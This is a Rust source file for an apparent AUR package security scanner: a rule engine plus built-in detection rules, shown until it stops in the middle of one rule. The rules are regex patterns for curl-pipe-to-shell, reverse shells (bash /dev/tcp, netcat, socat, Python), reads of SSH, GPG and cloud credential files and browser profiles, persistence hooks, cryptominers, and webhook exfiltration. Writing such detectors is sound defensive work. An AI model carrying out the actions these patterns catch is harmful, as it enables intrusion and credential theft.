//! Rule engine for pattern-based security detection

mod loader;

pub use loader::RuleLoader;

use crate::error::Result;
use crate::types::{Category, FileType, Severity};
use regex::Regex;
use serde::Deserialize;
use std::collections::HashMap;
use std::path::Path;

/// A security detection rule (pattern-based). Community rule files use this
/// shape; `file_types`/`patterns` default to empty so a rule file is concise.
#[derive(Debug, Clone, Deserialize)]
pub struct Rule {
    /// Unique identifier (e.g., "DLE-001")
    pub id: String,
    /// Human-readable name
    pub name: String,
    /// Detailed description
    pub description: String,
    /// Severity level
    pub severity: Severity,
    /// Category of the rule
    pub category: Category,
    /// Patterns to match
    #[serde(default)]
    pub patterns: Vec<Pattern>,
    /// File types this rule applies to
    #[serde(default)]
    pub file_types: Vec<FileType>,
    /// Recommendation for fixing
    pub recommendation: String,
    /// CWE ID if applicable
    #[serde(default)]
    pub cwe_id: Option<String>,
    /// Whether this rule is enabled
    #[serde(default = "default_true")]
    pub enabled: bool,
}

fn default_true() -> bool {
    true
}

/// Pattern type for matching
#[derive(Debug, Clone, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Pattern {
    /// Regular expression pattern
    Regex { pattern: String },
    /// Literal string match
    Literal {
        text: String,
        #[serde(default)]
        case_sensitive: bool,
    },
    /// Function name pattern
    Function {
        name: String,
        #[serde(default)]
        body_pattern: Option<String>,
    },
    /// Variable value pattern
    Variable {
        name: String,
        #[serde(default)]
        value_pattern: Option<String>,
    },
}

/// A compiled rule with pre-compiled regex patterns
pub struct CompiledRule {
    /// Original rule definition
    pub rule: Rule,
    /// Compiled regex patterns
    pub compiled_patterns: Vec<CompiledPattern>,
}

/// A compiled pattern ready for matching
#[derive(Clone)]
pub enum CompiledPattern {
    Regex(Regex),
    Literal { text: String, case_sensitive: bool },
    Function { name: Regex, body_pattern: Option<Regex> },
    Variable { name: String, value_pattern: Option<Regex> },
}

impl CompiledPattern {
    /// Compile a pattern
    pub fn compile(pattern: &Pattern) -> Result<Self> {
        match pattern {
            Pattern::Regex { pattern } => {
                let re = Regex::new(pattern)?;
                Ok(CompiledPattern::Regex(re))
            }
            Pattern::Literal {
                text,
                case_sensitive,
            } => Ok(CompiledPattern::Literal {
                text: text.clone(),
                case_sensitive: *case_sensitive,
            }),
            Pattern::Function { name, body_pattern } => {
                let name_re = Regex::new(name)?;
                let body_re = body_pattern
                    .as_ref()
                    .map(|p| Regex::new(p))
                    .transpose()?;
                Ok(CompiledPattern::Function {
                    name: name_re,
                    body_pattern: body_re,
                })
            }
            Pattern::Variable { name, value_pattern } => {
                let value_re = value_pattern
                    .as_ref()
                    .map(|p| Regex::new(p))
                    .transpose()?;
                Ok(CompiledPattern::Variable {
                    name: name.clone(),
                    value_pattern: value_re,
                })
            }
        }
    }
}

/// A match result from the rule engine
#[derive(Debug, Clone)]
pub struct RuleMatch {
    /// The rule that matched
    pub rule_id: String,
    /// Line number where the match occurred
    pub line: usize,
    /// Column where the match started
    pub column: usize,
    /// The matched text
    pub matched_text: String,
    /// Context around the match
    pub context: String,
}

/// Rule engine for loading and matching rules
pub struct RuleEngine {
    /// Compiled rules organized by file type
    rules_by_type: HashMap<FileType, Vec<CompiledRule>>,
    /// All rules indexed by ID
    rules_by_id: HashMap<String, CompiledRule>,
}

impl RuleEngine {
    /// Create a new empty rule engine
    pub fn new() -> Self {
        Self {
            rules_by_type: HashMap::new(),
            rules_by_id: HashMap::new(),
        }
    }

    /// Load rules from a directory containing TOML files
    pub fn load_rules_from_dir(&mut self, dir: &Path) -> Result<()> {
        let loader = RuleLoader::new();
        let rules = loader.load_from_directory(dir)?;

        for rule in rules {
            self.add_rule(rule)?;
        }

        Ok(())
    }

    /// Add a single rule to the engine
    pub fn add_rule(&mut self, rule: Rule) -> Result<()> {
        if !rule.enabled {
            return Ok(());
        }

        let mut compiled_patterns = Vec::new();
        for pattern in &rule.patterns {
            compiled_patterns.push(CompiledPattern::compile(pattern)?);
        }

        let compiled = CompiledRule {
            rule: rule.clone(),
            compiled_patterns,
        };

        // Index by file type
        for file_type in &rule.file_types {
            self.rules_by_type
                .entry(*file_type)
                .or_default()
                .push(CompiledRule {
                    rule: rule.clone(),
                    compiled_patterns: compiled.compiled_patterns.clone(),
                });
        }

        // Index by ID
        self.rules_by_id.insert(rule.id.clone(), compiled);

        Ok(())
    }

    /// Add built-in rules
    ///
    /// A single rule with a malformed pattern must never silently disable the
    /// rest of the built-in ruleset (a missed detection is a security failure),
    /// so a rule that fails to compile is skipped with a warning rather than
    /// aborting the whole load.
    pub fn add_builtin_rules(&mut self) -> Result<()> {
        let builtin_rules = get_builtin_rules();
        for rule in builtin_rules {
            let rule_id = rule.id.clone();
            if let Err(e) = self.add_rule(rule) {
                tracing::warn!("skipping built-in rule {rule_id}: failed to compile: {e}");
            }
        }
        Ok(())
    }

    /// Match content against all rules for a file type
    pub fn match_content(&self, content: &str, file_type: FileType) -> Vec<RuleMatch> {
        let mut matches = Vec::new();

        let rules = match self.rules_by_type.get(&file_type) {
            Some(r) => r,
            None => return matches,
        };

        let lines: Vec<&str> = content.lines().collect();
        // Lines that are informational text printed to the user (the body of a
        // non-redirected heredoc, e.g. a `cat <<EOF` post_install message) are
        // not executed, so path-presence rules must not match them. A redirected
        // heredoc (`<<EOF > file`) writes content and is still scanned.
        let informational = informational_lines(&lines);

        for compiled in rules {
            for (line_idx, line) in lines.iter().enumerate() {
                // Skip pure comment lines and printed heredoc message bodies.
                let trimmed = line.trim();
                if trimmed.starts_with('#') || informational[line_idx] {
                    continue;
                }

                for pattern in &compiled.compiled_patterns {
                    if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                        matches.push(RuleMatch {
                            rule_id: compiled.rule.id.clone(),
                            line: line_idx + 1,
                            column: m.0,
                            matched_text: m.1,
                            context: line.to_string(),
                        });
                    }
                }
            }
        }

        matches
    }

    /// Match a single pattern against a line
    fn match_pattern(
        &self,
        pattern: &CompiledPattern,
        line: &str,
        _rule: &Rule,
    ) -> Option<(usize, String)> {
        match pattern {
            CompiledPattern::Regex(re) => {
                re.find(line).map(|m| (m.start() + 1, m.as_str().to_string()))
            }
            CompiledPattern::Literal {
                text,
                case_sensitive,
            } => {
                let found = if *case_sensitive {
                    line.find(text)
                } else {
                    line.to_lowercase().find(&text.to_lowercase())
                };
                found.map(|pos| (pos + 1, text.clone()))
            }
            _ => None, // Function and Variable patterns need different handling
        }
    }

    /// Get a rule by ID
    pub fn get_rule(&self, id: &str) -> Option<&Rule> {
        self.rules_by_id.get(id).map(|c| &c.rule)
    }

    /// Get count of loaded rules
    pub fn rule_count(&self) -> usize {
        self.rules_by_id.len()
    }
}

impl Default for RuleEngine {
    fn default() -> Self {
        let mut engine = Self::new();
        let _ = engine.add_builtin_rules();
        // Load community rule files so user-contributed detections actually run
        // (the same directories the catalog indexes). A malformed file warns and
        // is skipped; it never breaks the engine.
        for dir in user_rule_dirs() {
            if dir.is_dir() {
                if let Err(e) = engine.load_rules_from_dir(&dir) {
                    tracing::warn!("failed to load community rules from {}: {}", dir.display(), e);
                }
            }
        }
        engine
    }
}

/// Standard directories users/distros can drop community rule TOML files into.
pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
    let mut dirs = vec![
        std::path::PathBuf::from("/usr/share/aur-scanner/rules.d"),
        std::path::PathBuf::from("/etc/aur-scanner/rules.d"),
    ];
    if let Some(cfg) = dirs::config_dir() {
        dirs.push(cfg.join("aur-scanner/rules.d"));
    }
    dirs
}

/// Flag each line that is the body of a non-redirected heredoc (printed text,
/// not executed code), so path/string-presence rules don't match user messages.
fn informational_lines(lines: &[&str]) -> Vec<bool> {
    let mut flags = vec![false; lines.len()];
    let mut terminator: Option<String> = None;
    for (i, line) in lines.iter().enumerate() {
        if let Some(delim) = &terminator {
            flags[i] = true; // inside a printed heredoc body
            if line.trim() == delim.as_str() {
                terminator = None;
            }
            continue;
        }
        if let Some(delim) = heredoc_message_delim(line) {
            terminator = Some(delim);
        }
    }
    flags
}

/// If `line` opens a heredoc that just prints a message (no redirection to a
/// file), return its terminator delimiter. Redirected heredocs write content
/// somewhere and must still be scanned, so they return `None`.
fn heredoc_message_delim(line: &str) -> Option<String> {
    let pos = line.find("<<")?;
    let rest = line[pos + 2..].strip_prefix('-').unwrap_or(&line[pos + 2..]).trim_start();
    let bytes = rest.as_bytes();
    let quote = match bytes.first() {
        Some(&b'"') | Some(&b'\'') => Some(bytes[0]),
        _ => None,
    };
    let mut i = if quote.is_some() { 1 } else { 0 };
    let start = i;
    while i < bytes.len() {
        let c = bytes[i];
        match quote {
            Some(q) if c == q => break,
            Some(_) => i += 1,
            None if c.is_ascii_alphanumeric() || c == b'_' => i += 1,
            None => break,
        }
    }
    if i == start {
        return None;
    }
    let delim = &rest[start..i];
    // `$((x << 2))` is an arithmetic shift, not a heredoc.
    if quote.is_none() && delim.as_bytes()[0].is_ascii_digit() {
        return None;
    }
    // Redirected to a file (`> f`, `>> f`, `| tee f`)? Then it writes content
    // and the body must be scanned.
    let redirected = line.contains(">>")
        || line[..pos].contains('>')
        || rest[i..].contains('>')
        || line.contains("tee ");
    if redirected {
        return None;
    }
    Some(delim.to_string())
}

/// Get built-in security rules (pattern-based). Public so the catalog can
/// index them as the single source of truth.
pub fn get_builtin_rules() -> Vec<Rule> {
    vec![
        // ============================================================
        // CRITICAL: Download and Execute (from real-world attacks)
        // ============================================================
        Rule {
            id: "DLE-001".to_string(),
            name: "Curl pipe to shell".to_string(),
            description: "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: r"curl\s+[^|]+\|\s*(ba)?sh".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Download scripts first, review them, then execute".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "DLE-002".to_string(),
            name: "Wget pipe to shell".to_string(),
            description: "Downloading and executing remote scripts via wget".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: r"wget\s+[^|]+\|\s*(ba)?sh".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Download scripts first, review them, then execute".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "DLE-003".to_string(),
            name: "Curl output executed".to_string(),
            description: "Curl output saved and executed - common malware pattern".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"curl\s+.*-o\s+[^\s]+\s*&&.*\b(ba)?sh\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"curl\s+.*-O\s+.*&&.*\./".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review downloaded scripts before execution".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Pastebin downloads (2018 xeactor attack vector)
        // ============================================================
        Rule {
            id: "PASTE-001".to_string(),
            name: "Pastebin download".to_string(),
            description: "Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(curl|wget)\s+.*(pastebin\.com|paste\.ee|ptpb\.pw|ix\.io|dpaste|hastebin|privatebin|ghostbin|rentry\.co)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"https?://(pastebin\.com|paste\.ee|ptpb\.pw|ix\.io|dpaste|hastebin\.com|privatebin|ghostbin\.co|rentry\.co)/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Never download code from paste sites - this is a major red flag".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Reverse Shells
        // ============================================================
        Rule {
            id: "SHELL-001".to_string(),
            name: "Bash reverse shell".to_string(),
            description: "Pattern indicates a bash reverse shell connection".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex {
                pattern: r"/dev/tcp/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-002".to_string(),
            name: "Netcat reverse shell".to_string(),
            description: "Netcat with execute flag indicates reverse shell".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"nc\s+.*-e\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"ncat\s+.*-e\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"nc\s+.*-c\s+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-003".to_string(),
            name: "Python reverse shell".to_string(),
            description: "Python socket connection pattern indicates reverse shell".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"python.*socket.*connect".to_string(),
                },
                Pattern::Regex {
                    pattern: r"python.*-c.*import\s+socket".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-004".to_string(),
            name: "Socat shell".to_string(),
            description: "Socat can be used for reverse shells".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"socat\s+.*EXEC:".to_string(),
                },
                Pattern::Regex {
                    pattern: r"socat\s+.*TCP:".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Socat TCP connections are suspicious in build scripts".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Credential Theft
        // ============================================================
        Rule {
            id: "CRED-001".to_string(),
            name: "SSH key access".to_string(),
            description: "Accessing SSH private keys during build/install".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.ssh/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.ssh/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/home/[^/]+/\.ssh/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access user SSH keys".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRED-002".to_string(),
            name: "GPG key access".to_string(),
            description: "Accessing GPG keyring during build/install".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.gnupg/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.gnupg/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access user GPG keys".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRED-003".to_string(),
            name: "Password file access".to_string(),
            description: "Accessing password files or credential stores".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/shadow".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.password-store".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.netrc".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.aws/credentials".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.kube/config".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access credential stores".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Browser Data Theft
        // ============================================================
        Rule {
            id: "BROWSER-001".to_string(),
            name: "Browser profile access".to_string(),
            description: "Accessing browser profiles may indicate credential theft".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.mozilla/firefox".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/google-chrome".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/chromium".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/BraveSoftware".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.librewolf".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.zen".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access browser profiles".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "BROWSER-002".to_string(),
            name: "Browser database access".to_string(),
            description: "Accessing browser SQLite databases (passwords, cookies, history)".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"logins\.json".to_string(),
                },
                Pattern::Regex {
                    pattern: r"Login Data".to_string(),
                },
                Pattern::Regex {
                    pattern: r"cookies\.sqlite".to_string(),
                },
                Pattern::Regex {
                    pattern: r"places\.sqlite".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access browser databases".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },

        // NOTE: privilege escalation (PRIV-001..006: sudo, SUID/SGID, sudoers,
        // capabilities, kernel modules, install-hook sudo) is owned by the
        // privilege analyzer (privilege.rs), which is function-aware. It is not
        // duplicated as pattern rules, to keep each finding ID single-owner.

        // ============================================================
        // CRITICAL: Install Script Execution (CHAOS RAT attack vector)
        // ============================================================
        Rule {
            id: "INSTALL-001".to_string(),
            name: "Python execution in install script".to_string(),
            description: "Executing Python in post_install is suspicious. Used in July 2025 CHAOS RAT attack.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\bpython[23]?\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"python\s+-c".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts should not execute Python code".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "INSTALL-002".to_string(),
            name: "Binary execution in install script".to_string(),
            description: "Executing binaries from /opt or package directories during install".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/opt/[^/]+/[^/]+\.(py|sh|bin)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\./[a-zA-Z0-9_-]+\s*$".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Review any binary execution during installation".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "INSTALL-003".to_string(),
            name: "Network access in install script".to_string(),
            description: "Install scripts should not make network connections".to_string(),
            severity: Severity::Critical,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(curl|wget|aria2c|axel)\b".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts should never download additional content".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "INSTALL-004".to_string(),
            name: "Language package manager invoked in install hook".to_string(),
            description: "An install scriptlet invokes a language package manager to fetch/install packages. Installing a package runs its arbitrary build/lifecycle scripts (preinstall, build.rs, setup.py, go generate, ...) at install time -- a remote code execution vector. The June 2026 Atomic Arch campaign used `npm install` this way (see ATOMIC-002); the same applies to pip, poetry, uv, pdm, cargo, go, gem, composer, conda, deno, and others.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(pip[23]?|pipx)\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bpoetry\s+(add|install)\b".to_string() },
                Pattern::Regex { pattern: r"\buv\s+(add|sync|pip|tool|run)\b".to_string() },
                Pattern::Regex { pattern: r"\bpdm\s+(add|install|sync)\b".to_string() },
                Pattern::Regex { pattern: r"\bconda\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bcargo\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bgo\s+(install|get)\b".to_string() },
                Pattern::Regex { pattern: r"\bgem\s+install\b".to_string() },
                Pattern::Regex { pattern: r"\bcomposer\s+(require|install)\b".to_string() },
                Pattern::Regex { pattern: r"\bdeno\s+(install|add|run|cache)\b".to_string() },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Persistence Mechanisms (2018 & 2025 attacks)
        // ============================================================
        Rule {
            id: "PERSIST-001".to_string(),
            name: "Systemd service creation in install".to_string(),
            description: "Creating systemd services in install scripts enables persistence. Used in 2018 xeactor and 2025 CHAOS RAT attacks.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"systemctl\s+(enable|start|daemon-reload)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/systemd/system/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"~/.config/systemd/user/".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Services should be enabled by the user, not automatically".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "PERSIST-002".to_string(),
            name: "Systemd timer creation".to_string(),
            description: "Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.timer".to_string(),
                },
                Pattern::Regex {
                    pattern: r"OnBootSec".to_string(),
                },
                Pattern::Regex {
                    pattern: r"OnUnitActiveSec".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Timers should be user-controlled; review carefully".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "PERSIST-003".to_string(),
            name: "Cron job creation".to_string(),
            description: "Creating cron jobs for persistence".to_string(),
            severity: Severity::High,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/cron".to_string(),
                },
                Pattern::Regex {
                    pattern: r"crontab\s+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Cron jobs should be managed by the user".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "PERSIST-004".to_string(),
            name: "rc.local modification".to_string(),
            description: "Modifying rc.local for boot persistence".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/rc\.local".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/rc\.d/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not modify boot scripts".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "PERSIST-005".to_string(),
            name: "XDG autostart creation".to_string(),
            description: "Creating autostart entries enables persistence at user login".to_string(),
            severity: Severity::High,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.config/autostart/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/xdg/autostart/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Autostart entries should be user-controlled".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "PERSIST-006".to_string(),
            name: "Systemd masquerading".to_string(),
            description: "Binary named like systemd component is suspicious. CHAOS RAT used 'systemd-initd'.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"systemd-[a-z]+d\b".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/usr/lib/systemd/systemd-".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify this is a legitimate systemd component".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Cryptomining
        // ============================================================
        Rule {
            id: "CRYPTO-001".to_string(),
            name: "Mining pool connection".to_string(),
            description: "Connection to cryptocurrency mining pools".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"stratum\+tcp://".to_string(),
                },
                Pattern::Regex {
                    pattern: r"pool\.(minergate|supportxmr|nanopool|hashvault|minexmr|f2pool)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove cryptomining components".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRYPTO-002".to_string(),
            name: "Cryptominer binary".to_string(),
            description: "Known cryptocurrency miner executable names".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(xmrig|cgminer|bfgminer|cpuminer|minerd|ethminer|t-rex|lolminer|phoenixminer)\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove cryptomining components".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRYPTO-003".to_string(),
            name: "Monero/Bitcoin wallet address".to_string(),
            description: "Cryptocurrency wallet addresses indicate mining or theft".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                // Monero addresses: 95 chars starting with 4, require context
                Pattern::Regex {
                    pattern: r#"(wallet|address|donate|payment|monero|xmr)[^=]*4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"#.to_string(),
                },
                // Bitcoin addresses with context (avoid matching checksums)
                Pattern::Regex {
                    pattern: r#"(wallet|address|donate|payment|bitcoin|btc)[^=]*(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"#.to_string(),
                },
                // Standalone wallet variables
                Pattern::Regex {
                    pattern: r#"(?i)(wallet|donate)_?(addr|address)?\s*=\s*['"]?[a-zA-Z0-9]{26,}"#.to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Wallet addresses in packages are highly suspicious".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Data Exfiltration
        // ============================================================
        Rule {
            id: "EXFIL-001".to_string(),
            name: "Curl POST data exfiltration".to_string(),
            description: "Sending data to external servers via curl POST".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"curl\s+.*(-d|--data|--data-binary)\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"curl\s+.*-X\s+POST".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Build/install should not send data externally".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-002".to_string(),
            name: "Netcat data transfer".to_string(),
            description: "Using netcat to transfer data externally".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\|\s*nc\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"nc\s+[^\s]+\s+\d+\s*<".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Netcat should not be piping data in build scripts".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-003".to_string(),
            name: "Discord/Telegram webhook".to_string(),
            description: "Webhook URLs can be used for C2 communication or data exfiltration".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"discord(app)?\.com/api/webhooks/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"api\.telegram\.org/bot".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Webhook URLs in packages are highly suspicious".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // HIGH: Obfuscation Techniques
        // ============================================================
        Rule {
            id: "OBF-001".to_string(),
            name: "Base64 decoding".to_string(),
            description: "Base64 decoding may hide malicious payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"base64\s+(-d|--decode)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"base64\s+-[a-zA-Z]*d".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review the base64 content manually".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-002".to_string(),
            name: "Eval usage".to_string(),
            description: "Eval can execute obfuscated malicious code".to_string(),
            severity: Severity::High,
            category: Category::CommandInjection,
